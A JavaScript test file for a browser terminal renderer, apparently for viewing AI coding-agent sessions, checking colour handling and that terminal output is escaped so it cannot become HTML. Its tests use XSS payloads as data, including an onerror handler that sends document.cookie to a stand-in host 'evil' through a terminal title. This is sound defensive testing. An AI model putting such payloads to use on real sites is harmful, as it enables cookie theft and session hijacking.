// Drawing an owned terminal in the browser.
//
// cmux gave us text with the styles stripped, so the panel could only ever show grey
// text. Owning the stream means we have the colours, and the renderer has to put them
// on screen without ever letting terminal output become markup: a transcript is input,
// not HTML, and escaping happens BEFORE anything is wrapped around it.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { renderRows, renderRun, xterm256 } from '../public/js/termview.js';

const run = (text, extra = {}) => ({
  text, start: 0, len: text.length, fg: null, bg: null, fg256: null, bg256: null,
  bold: false, dim: false, italic: false, underline: false, inverse: false, strike: false,
  ...extra,
});
const row = (...runs) => ({ y: 0, text: runs.map(r => r.text).join(''), runs });

test('terminal output can never become markup', () => {
  const html = renderRun(run('<script>alert(1)</script>'));
  assert.ok(!html.includes('<script>'), html);
  assert.match(html, /&lt;script&gt;/);
  assert.match(renderRun(run('a & b')), /a &amp; b/);
  assert.match(renderRun(run('say "hi"')), /&quot;hi&quot;/);
});

// The escape must happen before the wrapping, not after, or a colour attribute can be
// broken out of.
test('a colour cannot be used to break out of the attribute it sits in', () => {
  const html = renderRun(run('x', { fg: 0xff0000 }));
  assert.match(html, /#ff0000/);
  const nasty = renderRun(run('"><img src=x onerror=1>', { fg: 0x00ff00 }));
  assert.ok(!/<img/.test(nasty), nasty);
});

test('an unstyled run is plain text, with no span around it', () => {
  assert.equal(renderRun(run('hello')), 'hello');
});

test('truecolor and 256-colour both come out as a colour', () => {
  assert.match(renderRun(run('a', { fg: 0xd77757 })), /color:#d77757/);
  assert.match(renderRun(run('a', { bg: 0x001122 })), /background:#001122/);
  assert.match(renderRun(run('a', { fg256: 196 })), /color:#ff0000/);
  assert.match(renderRun(run('a', { bg256: 15 })), /background:#ffffff/);
});

test('the xterm palette is the real one, all 256 of it', () => {
  assert.equal(xterm256(0), '#000000');
  assert.equal(xterm256(15), '#ffffff');
  assert.equal(xterm256(196), '#ff0000');
  assert.equal(xterm256(231), '#ffffff');      // the top of the colour cube
  assert.equal(xterm256(232), '#080808');      // the greyscale ramp
  assert.equal(xterm256(255), '#eeeeee');
  for (let i = 0; i < 256; i++) assert.match(xterm256(i), /^#[0-9a-f]{6}$/, `index ${i}`);
});

test('the styles that carry meaning survive', () => {
  assert.match(renderRun(run('a', { bold: true })), /font-weight:700/);
  assert.match(renderRun(run('a', { italic: true })), /font-style:italic/);
  assert.match(renderRun(run('a', { underline: true })), /underline/);
  assert.match(renderRun(run('a', { strike: true })), /line-through/);
  // Dim is the one that matters: it is how Claude Code marks the suggestion in the
  // empty composer, and it must LOOK different or the panel lies about the draft.
  assert.match(renderRun(run('a', { dim: true })), /opacity:/);
});

test('inverse swaps the foreground and the background, which is how a cursor is drawn', () => {
  const html = renderRun(run('a', { fg: 0x111111, bg: 0xeeeeee, inverse: true }));
  assert.match(html, /color:#eeeeee/);
  assert.match(html, /background:#111111/);
});

test('rows come out one line per row, in order, with blanks kept', () => {
  const html = renderRows([row(run('first')), row(run('')), row(run('third'))]);
  const lines = html.split('\n');
  assert.equal(lines.length, 3);
  assert.match(lines[0], /first/);
  assert.equal(lines[1], '');
  assert.match(lines[2], /third/);
});

test('nothing at all renders as nothing, not as undefined', () => {
  assert.equal(renderRows([]), '');
  assert.equal(renderRows(null), '');
  assert.equal(renderRun(null), '');
});

// The real chain, end to end. A pen runs whatever you told it to, and anything it
// runs can print to its own terminal and set its own window title. So "the screen" is
// attacker-controlled by definition, and the page renders it.
test('a pen that prints markup at its own terminal cannot reach the page', async () => {
  const { createScreen, write, cellRows } = await import('../src/server/vt.js');
  const s = createScreen(120, 6);
  const payload = '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">';
  write(s, Buffer.from(`\x1b]0;${payload}\x07\x1b[1;1H${payload}`, 'utf8'));
  // The title is set with textContent on the page, so it only has to survive as text.
  assert.equal(s.title, payload, 'the title is kept as text, not as markup');
  const html = renderRows(cellRows(s));
  assert.ok(!/<img/.test(html), html.slice(0, 160));
  assert.match(html, /&lt;img/);
  // Styled the same way, so the escape cannot be skipped when a colour is involved.
  const t = createScreen(120, 6);
  write(t, Buffer.from(`\x1b[38;2;255;0;0m${payload}`, 'utf8'));
  const styled = renderRows(cellRows(t));
  assert.ok(!/<img/.test(styled), styled.slice(0, 160));
  assert.match(styled, /color:#ff0000/);
});

// rowsText must produce the EXACT string vt.toText would, because every terminal action
// is checked against the screen it was decided on (terminal.js, sameInput). If the page
// derives a different string from the same rows, a keystroke gets refused for a change
// that never happened - or worse, accepted after one that did.
test('the text the page derives is the text the server would have sent', async () => {
  const { createScreen, write, toText, cellRows } = await import('../src/server/vt.js');
  const { rowsText } = await import('../public/js/termview.js');
  const fs = await import('node:fs');
  const path = await import('node:path');
  for (const name of ['claude-tui.raw', 'codex-tui.raw']) {
    const s = createScreen(200, 50);
    const data = fs.readFileSync(path.join(import.meta.dirname, 'fixtures', name));
    for (let i = 0; i < data.length; i += 13) write(s, data.subarray(i, i + 13));
    assert.equal(rowsText(cellRows(s)), toText(s), `${name}: whole screen`);
    for (const n of [5, 40, 50]) {
      assert.equal(rowsText(cellRows(s), n), toText(s, n), `${name}: last ${n} lines`);
    }
  }
});

test('rowsText survives an empty or missing screen', async () => {
  const { rowsText } = await import('../public/js/termview.js');
  assert.equal(rowsText([]), '');
  assert.equal(rowsText(null), '');
  assert.equal(rowsText([{ y: 0, runs: [] }]), '');
});
